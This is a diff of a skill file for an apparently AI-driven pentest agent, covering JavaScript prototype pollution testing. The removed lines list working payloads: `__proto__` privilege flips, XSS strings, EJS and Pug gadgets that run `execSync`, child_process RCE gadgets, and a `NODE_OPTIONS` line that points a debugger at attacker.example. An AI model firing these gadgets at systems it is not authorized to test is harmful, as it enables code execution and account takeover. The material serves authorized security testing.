@@ -1,129 +1,46 @@
 ---
 name: prototype-pollution
-description: Detect and exploit JavaScript prototype pollution in client-side and server-side applications
+description: Test for JavaScript prototype pollution leading to XSS, RCE, or denial of service
 origin: Vigil
 vuln_class: prototype-pollution
 ---
 
 # Prototype Pollution Testing
 
-> **`vigil assess kali` audit flags:** use `--technique OTHER` (prototype pollution is a primitive with variable outcomes). Switch to `XSS` or `RCE` when the pollution produces that specifically.
-
 ## When to Activate
 
-- JavaScript/Node.js application accepts JSON input that may flow through deep merge or recursive assignment
-- Client-side JavaScript processes URL parameters, hash fragments, or JSON into objects
-- Server-side Express/Koa/Fastify endpoints accept nested JSON bodies
+- JavaScript apps (Node back-ends, SPAs) that deep-merge, clone or path-assign user-controlled
+  objects: JSON bodies, nested query strings, URL hashes, config imports.
 
-## Tools
+`--technique PROTOTYPE-POLLUTION`; send via `vigil assess kali exec --technique
+PROTOTYPE-POLLUTION --intent "<purpose>" --probe-kind payload --phase consume-test --timeout 30 --
+curl …`, and render client-side checks with `vigil assess kali browser`. Detection probes, merge
+sinks, filter bypasses, and XSS/RCE/DoS gadgets (EJS, Pug, Handlebars, `child_process` via
+`argv0`/`NODE_OPTIONS`): `agent/references/payloads/prototype-pollution-payloads.md`.
 
-- `vigil assess kali exec -- curl ...` (server-side pollution probing via JSON bodies — all target-facing curl must go through the kali exec wrapper; use `--technique OTHER --probe-kind payload --phase consume-test --timeout 30`)
-- Browser DevTools (client-side pollution detection and gadget chain testing — client-side analysis, not target-facing)
-- `ppmap` / `ppfuzz` (automated client-side prototype pollution scanning)
+## Method
 
-## Methodology
-
-### 1. Server-Side Detection
-- [ ] Send `__proto__` pollution probe in JSON body
-```json
-{"__proto__": {"polluted": "yes"}}
-{"constructor": {"prototype": {"polluted": "yes"}}}
-```
-- [ ] Verify pollution reflected in subsequent responses or behavior changes
-- [ ] Test alternate pollution vectors
-```json
-{"__proto__": {"status": 200}}
-{"__proto__": {"isAdmin": true}}
-{"constructor": {"prototype": {"isAdmin": true}}}
-```
-- [ ] Test deep-nested payloads that survive sanitization
-```json
-{"a": {"__proto__": {"polluted": "yes"}}}
-{"a": {"constructor": {"prototype": {"polluted": "yes"}}}}
-```
-
-### 2. Client-Side Detection
-- [ ] URL parameter pollution
-```
-?__proto__[polluted]=yes
-?__proto__.polluted=yes
-?constructor[prototype][polluted]=yes
-#__proto__[polluted]=yes
-```
-- [ ] Open browser console and check: `({}).polluted === "yes"`
-- [ ] Test via hash fragment (common in SPA routing)
-- [ ] Check for vulnerable merge libraries in JS bundles (lodash.merge, jQuery.extend, deep-extend)
-
-### 3. Vulnerable Merge Functions
-- [ ] Identify deep merge / recursive assign usage in source
-```
-lodash.merge         lodash.defaultsDeep    lodash.mergeWith
-jQuery.extend(true)  $.extend(true)
-Hoek.merge           Hoek.applyToDefaults
-deep-extend          deap.merge             mixin-deep
-```
-- [ ] Test prototype chain traversal through each identified function
-
-### 4. Chains to XSS
-- [ ] Pollute innerHTML handlers or template variables
-```json
-{"__proto__": {"innerHTML": "<img src=x onerror=alert(1)>"}}
-{"__proto__": {"srcdoc": "<script>alert(1)</script>"}}
-```
-- [ ] Framework-specific gadgets (EJS, Pug, Handlebars)
-```json
-// EJS: pollute opts.outputFunctionName
-{"__proto__": {"outputFunctionName": "x;process.mainModule.require('child_process').execSync('id');//"}}
-// Pug: pollute block
-{"__proto__": {"block": {"type": "Text", "val": "x]);process.mainModule.require('child_process').execSync('id');//"}}}
-// Handlebars: pollute constructor template
-{"__proto__": {"pendingContent": "<script>alert(1)</script>"}}
-```
-
-### 5. Chains to RCE
-- [ ] Pollute child_process spawn options
-```json
-{"__proto__": {"shell": "/proc/self/exe", "argv0": "console.log(require('child_process').execSync('id').toString())//"}}
-{"__proto__": {"env": {"NODE_OPTIONS": "--require /proc/self/environ"}}}
-{"__proto__": {"shell": true}}
-```
-- [ ] Pollute NODE_OPTIONS for module preload
-```json
-{"__proto__": {"env": {"NODE_OPTIONS": "--inspect=attacker.example:9229"}}}
-```
-
-### 6. Chains to DoS
-- [ ] Pollute toString or valueOf
-```json
-{"__proto__": {"toString": {"0": "throw new Error()"}}}
-{"__proto__": {"valueOf": null}}
-```
-- [ ] Pollute hasOwnProperty to break object iteration
-```json
-{"__proto__": {"hasOwnProperty": null}}
-```
-
-### 7. Framework-Specific Testing
-- [ ] Express: test body-parser JSON with nested `__proto__`
-- [ ] Koa: test koa-bodyparser with deep objects
-- [ ] Fastify: test JSON schema validation bypass via prototype keys
-- [ ] Next.js / Nuxt.js: test API route handlers and getServerSideProps
-
-### 8. Filter Bypass
-- [ ] Use `constructor.prototype` instead of `__proto__`
-- [ ] Use Unicode escapes: `\u005f\u005fproto\u005f\u005f`
-- [ ] Nest pollution inside arrays: `[{"__proto__": {"polluted": true}}]`
-- [ ] Case variations where parsers normalize keys
+1. **Server-side pollution is process-wide** and lasts until restart, so it affects every user.
+   Detect with a benign property whose effect shows up in later responses (Express `json spaces`
+   changing indentation, a polluted `status` on an error path), via `__proto__`,
+   `constructor.prototype` and nested forms. Do not probe with `isAdmin`, `shell` or similar on a
+   shared target: properties that change authorization or execution, and DoS gadgets, need operator
+   approval (`agent/shared-constraints.md` §1). Note the benign pollution in your handoff.
+2. **Client-side:** `?__proto__[x]=y`, `?constructor[prototype][x]=y` and hash variants, then
+   check `({}).x` in the rendered page; find the merge sink in the bundle (lodash, jQuery
+   `extend(true)`, deep-extend and others) and look for a script gadget.
+3. **Escalate through a gadget** in the code that runs after pollution: a template engine (EJS,
+   Pug, Handlebars), `child_process` spawning node, an authorization check reading a default
+   property, or a NoSQL query object inheriting an operator key
+   (`agent/skills/nosql-injection/SKILL.md`). Framework entry points worth trying: Express
+   body-parser and Koa bodyparser nesting, Fastify schema pass-through, Next.js/Nuxt API routes
+   and `getServerSideProps`.
 
 ## What to Record
 
-- Pollution vector (URL parameter, JSON body, hash fragment)
-- Exact payload that achieves pollution
-- Proof of pollution (console output, behavior change, error) — prove the attacker outcome (`agent/rules/hunting.md` §2), e.g., polluted `isAdmin: true` property was respected by the access check and granted admin panel access, EJS `outputFunctionName` gadget chain achieved RCE via `id` execution, XSS payload fired in another user's browser via polluted innerHTML handler
-- Gadget chain details if escalated to XSS/RCE/DoS
-- Affected library/function and version
-- Full request/response for reproducibility
-
-## Extended Resources
-
-_(none — methodology in skill)_
+Vector (body, query, hash), the payload, the observable proof of pollution, the gadget and the
+outcome it reaches (`agent/rules/hunting.md` §2: script execution in another user's browser, `id`
+output, an authorization check flipped), the library and version, and any process-wide state left
+behind. Pollution with no reachable gadget is a chain component
+(`agent/references/finding-fp-and-severity-gate.md`). Format:
+`agent/references/runtime-guides/web-finding-recording.md`.
